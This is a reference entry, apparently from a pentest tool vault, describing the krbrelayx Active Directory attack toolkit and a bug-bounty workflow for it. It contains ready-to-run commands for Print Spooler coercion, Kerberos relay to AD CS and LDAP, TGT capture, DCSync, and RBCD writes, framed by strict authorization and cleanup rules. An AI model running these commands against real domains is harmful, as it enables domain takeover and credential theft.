---
name: "krbrelayx"
categories:
  - blackarch-scanner
version: "72.dd22943"
homepage: "https://github.com/dirkjanm/krbrelayx"
packaged-by: [blackarch]
blackarch-builddate: "2026-10-25"
build-system: scripts
license: MIT
meta-checked: "2026-11-09"
github-repo: "dirkjanm/krbrelayx"
github-stars: 1690
github-pushed: "2026-10-23"
github-archived: false
github-issues: 17
github-match: "exact"
gh-checked: "2026-11-07"
worth: 6.7
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
last-refresh: "2026-11-19"
github-commits-year: 11
gh-activity-checked: "2026-11-09"
---

# krbrelayx

> Kerberos relaying and unconstrained delegation abuse toolkit for Active Directory.

## What it's for

krbrelayx is a toolkit by Dirk-jan Mollema (dirkjanm) for abusing Kerberos in Active
Directory environments. The centerpiece `krbrelayx.py` runs an SMB/HTTP listener that
either relays incoming Kerberos authentication to a chosen target (LDAP, HTTP, AD CS
enrollment pages — anything that accepts a service ticket for an SPN you control) or,
when given the keys of an account with unconstrained delegation, decrypts and dumps
the TGTs that other machines forward to it. The bundled helpers close the setup gap:
`dnstool.py` creates and edits AD-integrated DNS records over LDAP so a name you
control resolves to your host, `addspn.py` writes the servicePrincipalName that makes
Kerberos accept the relay, and `printerbug.py` coerces a host to authenticate back to
you via the Print Spooler bug. It does not coerce authentication by itself and it is
not an NTLM relay tool — pair it with a coercion primitive (or mitm6 for the
DNS-based variant). Requires impacket, ldap3 and dnspython. On BlackArch the main
listener is exposed as `krbrelayx` and the helper scripts live in
`/usr/share/krbrelayx/`.

## Typical use cases

### Point an AD-integrated DNS name at your host

```
python3 /usr/share/krbrelayx/dnstool.py -u 'example.com\user' -p 'Password1' -r attacker.example.com -a add -d 198.51.100.10 dc01.example.com
```

Outcome: Creates (or modifies, with `-a modify`) the A record `attacker.example.com` in the AD-integrated DNS zone via LDAP, resolving to 198.51.100.10. Any client resolving that name now reaches your machine — the prerequisite for serving a Kerberos SPN there. Re-run with `-a query` to read the record back, `-a remove` to mark it for deletion.

### Add the servicePrincipalName the relay needs

```
python3 /usr/share/krbrelayx/addspn.py -u 'example.com\user' -p 'Password1' -s http/attacker.example.com dc01.example.com
```

Outcome: Writes `http/attacker.example.com` to the servicePrincipalName attribute of the account named by `-u` (add `-t COMPUTER$` to target another account instead), making that host a valid Kerberos service identity clients will request tickets for. `-q` shows the account's current SPNs, `-r` removes the SPN again.

### Dump forwarded TGTs via an unconstrained delegation account

```
krbrelayx -hashes :NTHASH
```

Outcome: Starts the listener authenticated as your delegation account (password works too: `-p 'Password1' -s EXAMPLE.COM\user` for the salt). With no `-t` target, tickets are not relayed: each incoming AP-REQ's forwarded TGT is decrypted and written to the loot directory (`-l`, default cwd) as `.ccache` files (`-f kirbi` for Mimikatz format) that can be replayed with impacket tools using `-k`.

### Relay coerced authentication to an AD CS enrollment page

```
krbrelayx -debug -t https://dc01.example.com/certsrv/ --adcs --template DomainController
```

Outcome: Listens with relay mode enabled and, once a victim is coerced to authenticate to a name whose SPN you control, forwards the Kerberos exchange to the CA's web enrollment endpoint and requests a certificate on the victim's behalf — `--template DomainController` when relaying a DC (defaults are Machine/User for accounts ending in `$`). The resulting certificate typically enables impersonation of the victim account for certificate-based auth.

### Coerce a Domain Controller to authenticate back to you

```
python3 /usr/share/krbrelayx/printerbug.py example.com/user:Password1@dc01.example.com 198.51.100.10
```

Outcome: Triggers the Print Spooler (MS-RPRN) bug on dc01 so it opens an SMB session back to 198.51.100.10 carrying Kerberos/NTLM authentication — exactly the event the krbrelayx listener above is waiting for. Accepts `-hashes LM:NTHASH` instead of a password, and `-target-file` to hit many hosts.

---

## Bug bounty workflow with krbrelayx

**Read this before anything else.** krbrelayx is not a scanner and nothing it does is passive once you leave enumeration. The moment you add an SPN, write a DNS record, create a computer account, or grant a replication ACE, you have *modified Active Directory* on the target's production directory service. That places krbrelayx in a completely different authorization tier from the web/API tools in this vault. It belongs **only** to engagements whose scope explicitly includes Active Directory and explicitly permits domain-object creation and modification — dedicated internal-network or AD bug bounty programs (a handful of enterprise programs run these), red-team engagements with a signed rules-of-engagement, or your own lab. The overwhelming majority of public web bug bounty programs do **not** authorize any of this, and running krbrelayx against them is out-of-scope activity that gets accounts banned and, because it touches a domain controller, can be treated as an intrusion. If the program scope does not name AD and object modification in writing, stop here.

The workflow below assumes you cleared that gate. It mirrors the two reliable primitives the toolkit actually delivers in 2026: **capturing TGTs through an unconstrained-delegation account**, and **relaying coerced Kerberos to an HTTP endpoint (AD CS web enrollment)**. The LDAP-relay escalations (`--escalate-user`, `--delegate-access`) are documented but increasingly blocked by LDAP signing/channel-binding — treat them as "try last, expect failure," not the default.

### Phase 0 — Authorization and blast-radius gate

Before touching the directory, write down three things and get them acknowledged by the program:

- **The exact objects you will create** (DNS A record, SPN, computer account) and **the exact attributes you will modify** (`servicePrincipalName`, `msDS-AdditionalDnsHostName`, an ACE on the domain head, `msDS-AllowedToActOnBehalfOfOtherIdentities`). Each is a concrete rollback item for Phase 5.
- **Which hosts you will coerce.** Coercing a domain controller is the point, but a DC is production infrastructure. One coercion call per PoC, aimed at one named DC, is defensible; looping `printerbug.py` over a host list is not.
- **Whether DCSync is in scope.** Unconstrained-delegation abuse ends in a DC machine TGT with replication rights — i.e. the keys to the domain. Many programs want you to *stop at the TGT* and not actually run `-just-dc`. Confirm where the line is before you cross it.

### Phase 1 — Enumerate the delegation and coercion surface (read-only)

Everything here is ordinary authenticated LDAP reading — safe, no modification, and the part you can do liberally.

```
# Accounts trusted for unconstrained delegation (TRUSTED_FOR_DELEGATION, bit 0x80000)
# — these are the accounts whose keys turn krbrelayx into a TGT sink.
python3 /usr/share/krbrelayx/addspn.py -u 'example.com\user' -p 'Password1' -q dc01.example.com
# (addspn -q reads SPNs; pair with any LDAP browser — e.g. impacket findDelegation.py —
#  to list userAccountControl TRUSTED_FOR_DELEGATION and msDS-AllowedToDelegateTo)
```

What you are mapping:

- **Unconstrained delegation accounts** (computers or users). If you can recover one's keys (machine-account secret, service-account password), you can host the listener as that identity and decrypt any TGT forwarded to it. A DC is itself unconstrained-delegation-trusted — but you need its keys, which is circular; the realistic target is a *member* server or service account with the flag set.
- **AD CS web enrollment** (`http(s)://ca/certsrv/`). Reachable, NTLM/Kerberos-authenticated enrollment is the HTTP relay target that still works when LDAP relay does not.
- **LDAP signing / channel-binding posture.** If the domain enforces LDAP signing (the modern default direction), Kerberos relay to `ldap://` fails because the Kerberos exchange negotiates integrity that LDAP then requires — so the `--escalate-user`/`--delegate-access` paths below will not land. Note this now so you do not waste a coercion on a dead relay.
- **A coercion primitive.** The bundled `printerbug.py` (MS-RPRN). Out of the box you may also reach for PetitPotam (MS-EFSR), PrivExchange (Exchange), or mitm6 for the DNS-poisoning variant — but only the bundled one ships here.

### Phase 2 — Stand up the listener identity

The victim must authenticate to a name whose SPN you control, and that name must resolve to your host. Two writes, both reversible:

```
# 1. A record so the coerced host connects to you (reversible in Phase 5)
python3 /usr/share/krbrelayx/dnstool.py -u 'example.com\user' -p 'Password1' \
  -r attacker.example.com --action add -d 198.51.100.10 dc01.example.com

# 2. The SPN clients will request a ticket for.
#    Computer accounts reject arbitrary SPNs — write it via msDS-AdditionalDnsHostName (-a):
python3 /usr/share/krbrelayx/addspn.py -u 'example.com\ws01$' \
  -p 'aad3b...:c1c6...' -t ws01.example.com -s host/attacker.example.com \
  -a dc01.example.com
```

Record the pre-change state (`-q` SPN dump, `--action query` DNS read) so you can prove and reverse every write.

### Phase 3 — Capture or relay

**Path A — unconstrained delegation TGT capture (most reliable).** Run the listener as the delegation account, no `-t`, so tickets are stored not relayed; then coerce one host:

```
sudo krbrelayx -aesKey <AES256-of-the-deleg-account>      # or -hashes :NTHASH
# in another shell, exactly one coercion at the listener:
python3 /usr/share/krbrelayx/printerbug.py -hashes :NTHASH \
  example.com/ws01\$@dc01.example.com attacker.example.com
```

The DC forwards its TGT; krbrelayx decrypts and writes `DC01$@EXAMPLE.COM_krbtgt@EXAMPLE.COM.ccache`.

**Path B — AD CS (ESC8-over-Kerberos).** Relay the coerced Kerberos to the CA web endpoint and enrol a cert as the victim:

```
sudo krbrelayx -t http://ca01.example.com/certsrv/ --adcs \
  --template Machine -v ws01.example.com
```

`-v/--victim` makes krbrelayx request the certificate with the victim's identity filled in. `--template DomainController` when the coerced principal is a DC; `Machine`/`User` otherwise.

### Phase 4 — Convert to impact

- **Captured DC TGT → DCSync** (only if Phase 0 authorized it):
  `export KRB5CCNAME=DC01\$@EXAMPLE.COM_krbtgt@EXAMPLE.COM.ccache` then `secretsdump.py -k -just-dc dc01.example.com`.
- **AD CS cert → authentication.** The enrolled certificate authenticates as the victim machine/user via PKINIT, yielding a TGT (e.g. `gettgtpkinit.py`) — impersonation without ever touching the password.
- **LDAP escalations (expect signing to block).** `--escalate-user <user>` grants that user the replication ACE (DCSync) on the domain head; `--add-computer` + `--delegate-access` writes RBCD on the relayed computer so your new computer account can S4U-impersonate to it. Both require a successful `ldap://` relay, which modern LDAP signing usually refuses.

### Phase 5 — Cleanup (REQUIRED) and reporting

Reverse every object in creation order, verify each reversal, and screenshot the before/after. See the dedicated sections below — cleanup is not optional on this tool; a left-behind SPN, DNS record, computer account, RBCD write, or replication ACE is a persistent security hole you introduced into the target's directory.

## Where the money is with krbrelayx

The payout is always *domain compromise or account impersonation*; krbrelayx is the delivery mechanism. Severity is uniformly Critical in an AD-scoped program because every path ends in credential-equivalent access — the real differentiators are **reliability** (does it still work against a hardened domain) and **dupe/authorization risk**.

| Primitive | Flag / mode | Ends in | Reliability in 2026 | Dupe / scope risk |
|---|---|---|---|---|
| Unconstrained-delegation TGT capture | listener, no `-t` (`-aesKey`/`-hashes`) | DC machine TGT → DCSync → full domain | High — not blocked by LDAP signing (you use a real TGT, not a relay) | Low dupe (needs a recoverable deleg account); **highest authorization burden** — ends in domain keys |
| AD CS relay (ESC8-over-Kerberos) | `--adcs --template -v` | Victim cert → PKINIT TGT → impersonation | High where a web-enrollment CA exists | Medium — ESC8 is well-known, often already reported on a given CA |
| DCSync-ACE grant | `--escalate-user` (LDAP relay) | Named user gains replication rights → DCSync | Low — LDAP signing/channel-binding usually blocks the relay | High dupe on soft domains; fails on hard ones |
| RBCD write | `--add-computer --delegate-access` (LDAP relay) | New computer can S4U-impersonate to the relayed host | Low — same LDAP-signing wall | Medium |
| SMB attack (exec/hashes) | `-t smb://` `-c`/`-e`/`--enum-local-admins` | Command exec / local secrets on target | Partial — README flags SMB-as-target as incomplete | Medium |

**Not a krbrelayx feature — do not claim it:** *shadow credentials* (writing `msDS-KeyCredentialLink`). krbrelayx has no such option; that technique lives in `ntlmrelayx.py --shadow-credentials`, `pywhisker`, and `certipy`. For a relayed computer account, krbrelayx's nearest equivalent is the RBCD write above. If a report calls for shadow credentials, reach for the right tool rather than inventing a krbrelayx flag.

## Command recipes

All examples use `example.com` / `EXAMPLE.COM`, the DC `dc01.example.com`, a member host `ws01.example.com` (`ws01$`), the CA `ca01.example.com`, and your listener at `198.51.100.10` / `attacker.example.com`. Replace with authorized values. **Discipline that keeps you in scope:** scope every relay to a single `-t` target, coerce exactly one host per PoC, and never watch a target file in a loop against production.

### Recipe 1 — Capture a DC TGT via unconstrained delegation

```
sudo krbrelayx -aesKey 9ff86898afa70f5f7b9f2bf16320cb38edb2639409e1bc441ac417fac1fed5ab
# Expected: "[*] Servers started, waiting for connections" on SMB/445 + HTTP/80.
# After one coercion:
# [*] SMBD: Received connection from 198.51.100.x
# [*] Got ticket for DC01$@EXAMPLE.COM [krbtgt@EXAMPLE.COM]
# [*] Saving ticket in DC01$@EXAMPLE.COM_krbtgt@EXAMPLE.COM.ccache
```

A password-based delegation account instead of a key: `krbrelayx --krbpass 'Service01!' --krbsalt EXAMPLE.COMsvc_sql` (salt = uppercase realm concatenated with the case-sensitive sAMAccountName). `-f kirbi` writes Mimikatz-format tickets; `-l /authorized/loot` sets the output directory.

### Recipe 2 — Coerce exactly one DC (single request)

```
python3 /usr/share/krbrelayx/printerbug.py -hashes :c1c635aa12ae60b7fe39e28456a7bac6 \
  example.com/ws01\$@dc01.example.com attacker.example.com
# Expected:
# [*] Attempting to trigger authentication via rprn RPC at dc01.example.com
# [*] Bind OK
# [*] Got handle
# [*] Triggered RPC backconnect, this may or may not have worked
```

`-no-pass -k` uses a ccache from `KRB5CCNAME` instead of a hash; `-target-ip` when the name does not resolve. Do **not** pass `-target-file` against production — that is a coercion sweep, not a PoC.

### Recipe 3 — AD CS relay (ESC8 over Kerberos)

```
sudo krbrelayx -debug -t http://ca01.example.com/certsrv/ --adcs --template Machine -v ws01.example.com
# Expected after coercion:
# [*] Authenticating against http://ca01.example.com/certsrv/ as EXAMPLE.COM/WS01$
# [*] Requesting certificate for ... template Machine
# [*] GOT CERTIFICATE! ID 1337
# [*] Base64 certificate of user WS01$: MIIS...
```

Relay works most reliably when the CA is **not** the same DC the victim uses for Kerberos. `--template DomainController` when coercing a DC.

### Recipe 4 — Point a name at your host, then take it back

```
# Create:
python3 /usr/share/krbrelayx/dnstool.py -u 'example.com\user' -p 'Password1' \
  -r attacker.example.com --action add -d 198.51.100.10 dc01.example.com
# Verify:
python3 /usr/share/krbrelayx/dnstool.py -u 'example.com\user' -p 'Password1' \
  -r attacker.example.com --action query dc01.example.com
# Remove on cleanup:
python3 /usr/share/krbrelayx/dnstool.py -u 'example.com\user' -p 'Password1' \
  -r attacker.example.com --action remove dc01.example.com
```

AD-integrated DNS lets any authenticated user add a record that does not already exist; the DNS service refreshes from LDAP roughly every 180 seconds, so allow time for the name to resolve and for a removal to clear.

### Recipe 5 — LDAP escalation (try last; expect signing to block)

```
sudo krbrelayx -t ldap://dc01.example.com --escalate-user helpdesk
# On a domain WITHOUT LDAP signing/CB enforced:
# [*] Authenticating against ldap://dc01.example.com as EXAMPLE.COM/WS01$
# [*] Attempting to escalate user helpdesk on dc01.example.com
# [*] User privileges modified. Adding ACL to domain root
# On a hardened domain you instead see the relay rejected (integrity/signing required).
```

`--no-da` skips the Domain-Admin add, `--no-acl` skips ACL abuse, `--no-validate-privs` assumes rights rather than checking — use the narrowest option set the PoC needs.

### Recipe 6 — Getting the delegation account's key material

krbrelayx hosts the listener *as* the unconstrained-delegation account, so it needs that account's Kerberos keys. Where they come from depends on the account type:

```
# Computer account: pull its secrets with secretsdump (needs local-admin on that host,
# or DCSync). The AES256 key feeds -aesKey; the NT hash feeds -hashes :NTHASH.
secretsdump.py 'example.com/user:Password1@ws01.example.com'
#   WS01$:aes256-cts-hmac-sha1-96:9ff868...   -> krbrelayx -aesKey 9ff868...
#   WS01$:aad3b435...:c1c635aa...              -> krbrelayx -hashes :c1c635aa...
```

For a *service account* you know the password of, the RC4 key is simply its NT hash — `MD4(UTF-16LE(password))` — or let krbrelayx derive the AES keys itself from `--krbpass`/`--krbsalt` (salt = uppercase realm + case-sensitive sAMAccountName, e.g. `EXAMPLE.COMsvc_sql`). Prefer `-aesKey` when the domain is AES-only; an account may have no usable RC4 key.

### Recipe 7 — RBCD chain (LDAP relay; blocked by signing on hardened domains)

The full resource-based constrained delegation path, for completeness — it only lands where `ldap://` relay succeeds:

```
# Relay the coerced Kerberos to LDAP, create a computer account, and write RBCD
# (msDS-AllowedToActOnBehalfOfOtherIdentities) on the relayed host toward it:
sudo krbrelayx -t ldap://dc01.example.com --add-computer --delegate-access
#   [*] Adding new computer with name: ATTACKERPC$ and password: ...
#   [*] Delegation rights modified successfully!
# Then S4U-impersonate an admin to the relayed host using the new computer account:
getST.py -spn cifs/ws01.example.com -impersonate administrator \
  'example.com/ATTACKERPC$:<generated-pw>'
```

`--add-computer` relies on the default `ms-DS-MachineAccountQuota` (10) letting any authenticated user join computers; if the quota is 0 the create fails and you must supply an existing account you control. Clean up the computer account **and** the RBCD attribute in Phase 5.

### Coercion primitives that pair with krbrelayx

Only `printerbug.py` ships in the toolkit; the rest are external and must be in your authorized toolset.

| Primitive | Protocol | Ships with krbrelayx | Note |
|---|---|---|---|
| `printerbug.py` | MS-RPRN (Print Spooler) | Yes (bundled) | Default; disabled where the Spooler service is off |
| PetitPotam | MS-EFSR (EFS RPC) | No | Reaches hosts with Spooler disabled; some vectors need no creds |
| PrivExchange | Exchange PushSubscription HTTP | No | Coerces an Exchange server over HTTP |
| mitm6 | DNS/WPAD poisoning | No | The DNS-based variant in dirkjanm's second post; no RPC call |

Whichever you use, fire it **once** at a single named host per PoC — a coercion loop against domain controllers is a denial-of-service pattern, not a proof of concept.

## Pitfalls, noise and scope discipline

**This tool modifies the directory — that is the whole risk.** Every rejection and ban with krbrelayx traces to a hunter treating a domain-write tool like a read-only scanner.

- **Running it outside an AD-scoped program.** The single fastest way to get banned. A web/API program's scope does not cover creating computer accounts on a domain controller. If the ROE does not name Active Directory *and* object modification, krbrelayx is off-limits — full stop.
- **Coercion sweeps = self-inflicted DoS.** `printerbug.py -target-file` or a relay watching a target file (`-tf ... -w`) in a loop hammers domain controllers with RPC and authentication, degrades them, and trips every EDR. One coercion, one named host, per PoC.
- **Leaving objects behind.** An orphaned computer account (from `--add-computer`), a stale SPN, a lingering DNS record, an uncleaned RBCD attribute, or a replication ACE you granted with `--escalate-user` are *persistent backdoors you introduced*. A left-behind DCSync ACE is a full-domain compromise handed to the next person who finds it. Reversing them is mandatory, not courtesy.
- **DNS pollution.** A wrong `dnstool.py` write to a shared AD-integrated zone can misdirect production name resolution. Use a unique attacker name, never overwrite an existing record (`--action add` only creates new; avoid `modify` on live names), and remove it promptly.
- **Burning a coercion on a dead relay.** Relaying Kerberos to `ldap://` fails under LDAP signing/channel-binding (the Kerberos exchange negotiates integrity that LDAP enforces). Check the signing posture in Phase 1 before spending a coercion on `--escalate-user`/`--delegate-access`; if enforced, pivot to the TGT-capture or AD CS paths.
- **Crossing the DCSync line without permission.** Capturing a DC TGT is one severity conversation; actually running `secretsdump -just-dc` and pulling `krbtgt` is another. Many programs want the TGT as proof and nothing further. Know where the line is and stop there.
- **`host/` vs the SPN the ticket actually targets.** If the SPN class you add does not match what the coerced service requests, no ticket arrives and you will blame the tool. Confirm the SPN with `addspn.py -q` before coercing.
- **Over-claiming capability.** Do not report "shadow credentials via krbrelayx" or cite flags like `--altname` that are not in the tool — the README exposes no such options. Inventing capability in a report gets it closed as invalid and damages your standing with the program.

## Reporting evidence

Capture a clean, reversible narrative — the triager needs to see impact *and* that you left the directory as you found it.

- **The listener console**, verbatim: the `Servers started` line, the `Got ticket for DC01$@EXAMPLE.COM` / `GOT CERTIFICATE! ID` line, and the save path. These timestamped lines are the proof the coercion-and-capture actually happened.
- **The coercion output** from `printerbug.py` (`Triggered RPC backconnect`) alongside the listener hit, so the cause/effect pair is unambiguous.
- **The artifact, not the secret it unlocks.** The `.ccache`/`.pem` filename and a redacted base64 head demonstrate possession; you do not need to dump the domain to prove a DC TGT. If DCSync is authorized, a *single* redacted account hash (not the full `krbtgt`) is sufficient proof.
- **Before/after attribute state** for every object you touched: `addspn.py -q` and `dnstool.py --action query` output before and after, and the directory state of any created computer account or granted ACE. This doubles as your cleanup proof.
- **A cleanup section in the report**: each created object, the exact reversal command, and a post-removal query showing it gone (DNS record removed, SPN cleared, computer account deleted, RBCD attribute and replication ACE reverted). State explicitly that cleanup completed and verify it — on an AD engagement the cleanup log is as important as the PoC.
- **Remediation pointer**: name the root cause (unconstrained delegation configured on `ws01$`; AD CS web enrollment with NTLM/Kerberos and no Extended Protection/HTTPS binding; LDAP signing not enforced) so the fix is actionable, not just "we got domain admin."

## References

- krbrelayx repository and README (flags, attack modes, TODO notes) — https://github.com/dirkjanm/krbrelayx
- Dirk-jan Mollema, "Abusing unconstrained delegation" / krbrelayx toolkit release — https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/
- Dirk-jan Mollema, "Relaying Kerberos over DNS with krbrelayx and mitm6" (AD CS/ESC8 over Kerberos, relay-mode limits) — https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/
- The Hacker Recipes, "Kerberos relay" (relay-to-LDAP integrity limitation, ESC8 framing, coercion pairings) — https://www.thehacker.recipes/ad/movement/kerberos/relay

*Research supplement added 2026-11-16, grounded in the krbrelayx README (github.com/dirkjanm/krbrelayx), Dirk-jan Mollema's unconstrained-delegation and Kerberos-over-DNS blog posts, and The Hacker Recipes Kerberos-relay notes; flags verified against the repository README — shadow-credential and `--altname` capabilities deliberately omitted as they are not implemented in krbrelayx (model: claude-opus-4-8).*
